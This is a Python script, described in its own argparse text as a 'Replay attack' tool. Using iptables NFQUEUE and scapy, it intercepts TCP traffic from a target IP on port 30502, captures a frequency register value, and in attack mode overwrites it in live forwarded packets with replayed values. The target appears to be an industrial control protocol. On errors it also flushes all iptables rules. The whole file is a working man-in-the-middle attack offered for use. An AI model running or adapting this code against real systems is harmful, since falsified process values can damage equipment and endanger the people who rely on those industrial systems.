from scapy.all import *
from netfilterqueue import NetfilterQueue
import random
import numpy as np

change_values = []
debugging = False

def get_values():
    global read
    global change_values
    with open(read, 'r') as f:
        for line in f:
            change_values.append(int(line.strip()))
    print(f"[*] Values read from {read}")
    return change_values

def store_values(output):
    with open(output, 'w') as f:
        for value in change_values:
            f.write(f"{value}\n")
    print(f"[*] Values stored in {output}")

def capture_traffic(scapy_packet):
    global change_values
    global debugging
    try:
        packet = IP(scapy_packet.get_payload())
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            data = payload[9:]

            first_register = int.from_bytes(data[0:2], byteorder="big")
            if first_register == 101 and len(payload) > 100:
                hz_register = int.from_bytes(data[32:34], byteorder="big")
                change_values.append(hz_register)
                if debugging: print(f"[*] Frequency captured: {change_values[-1]}")
        scapy_packet.accept()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        traceback.print_exc()
        scapy_packet.drop() 
        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")


def modify_packet(scapy_packet):
    global change_values
    global debugging
    try:
        packet = IP(scapy_packet.get_payload())
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            data = payload[9:]

            first_register = int.from_bytes(data[0:2], byteorder="big")
            if first_register == 101 and len(payload) > 100:
                hz_register = int.from_bytes(data[32:34], byteorder="big")
                
                #debug
                if debugging: print("Orginal Frequency:", hz_register)
                
                if len(change_values) == 0: get_values()
                change_value=change_values.pop(0)
                
                change_value = int(change_value)
                
                #debug        
                if debugging: print("Change Value:", change_value)
                
                new_sec_register = change_value
                if new_sec_register < 0:
                    new_sec_register = -new_sec_register
                if new_sec_register > 65535:
                    new_sec_register = 65535-change_value
                new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]

                packet[Raw].load = modified_payload

                del packet[IP].len
                del packet[IP].chksum
                if packet.haslayer(TCP):
                    del packet[TCP].chksum
                
                #debug  
                if debugging: print("Modified Frequecy:", new_sec_register)
 

                scapy_packet.set_payload(bytes(packet))
                #debug
                if debugging: print("Modified and sent packet \n")


        scapy_packet.accept()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        traceback.print_exc()
        scapy_packet.drop() 
        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")

def setup_iptables(ip,port):
    os.system(f'iptables -I FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')

def cleanup_iptables(ip, port):
    os.system(f'iptables -D FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')

def check_edge_cases(store, output, attack, read):
    if not (attack or store):
        print("[!] Error: Mode must be specified (use -s for store or -a for attack)")
        return True

    if attack and store:
        print("[!] Error: Attack mode and store mode cannot be used together")
        return True
    if store:
        if os.path.exists(output):
            print(f"[!] Warning: Output file '{output}' already exists. It will be overwritten.")
        try:
            with open(output, 'w') as f:
                pass
            os.remove(output)
        except PermissionError:
            print(f"[!] Error: No write permission for output file: {output}")
            return True
    if attack:
        if not os.path.exists(read):
            print(f"[!] Error: Input file for attack mode does not exist: {read}")
            return True
        try:
            with open(read, 'r') as f:
                pass
        except PermissionError:
            print(f"[!] Error: No read permission for input file: {read}")
            return True
    if os.geteuid() != 0:
        print("[!] Error: This script requires root privileges. Please run with sudo.")
        return True
    
    return False
        

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Replay attack')
    parser.add_argument('target', help='IP of target')
    parser.add_argument('-p', '--port', default='30502',
                       help='Port of target')
    
    parser.add_argument('-s', '--store', default=False, action='store_true',
                       help='Store values in csv file')
    parser.add_argument('-o', '--output', default='captured_freq.csv',
                       help='Output csv file (default: captured_freq.csv)')
    
    parser.add_argument('-a', '--attack', default=False, action='store_true',
                       help='Attack mode')
    parser.add_argument('-r', '--read' , default='captured_freq.csv',
                       help='Read from csv file (default: captured_freq.csv)')
    
    parser.add_argument('-d', '--debug', default=False, action='store_true',
                       help='Debug mode')
    args = parser.parse_args()
    
    ip = args.target
    port=args.port
    debugging = args.debug
    
    store=args.store
    output=args.output
    
    attack=args.attack
    read=args.read
    
    if check_edge_cases(store, output, attack, read): sys.exit(1)

    try:
        setup_iptables(ip,port)
        print(f"[*] IPTables rules set on {ip}:{port}")
        nfqueue = NetfilterQueue()
        print("[*] Creating NFQUEUE")
        if attack: 
            nfqueue.bind(1, modify_packet)
            print("[*] Started attack mode")
        elif store: 
            nfqueue.bind(1, capture_traffic)
            print("[*] Started capture mode")
        print("[*] Starting NFQUEUE")
        nfqueue.run() 
    except Exception as e:
        print("[*] Error:", e)
    except KeyboardInterrupt:
        print("[*] Stopping NFQUEUE")
    finally:
        if nfqueue:
            nfqueue.unbind()
            print("[*] Stopped NFQUEUE")
        if store: store_values(output)
        cleanup_iptables(ip,port)
        print("[*] IPTables rules removed")
        sys.exit(0)
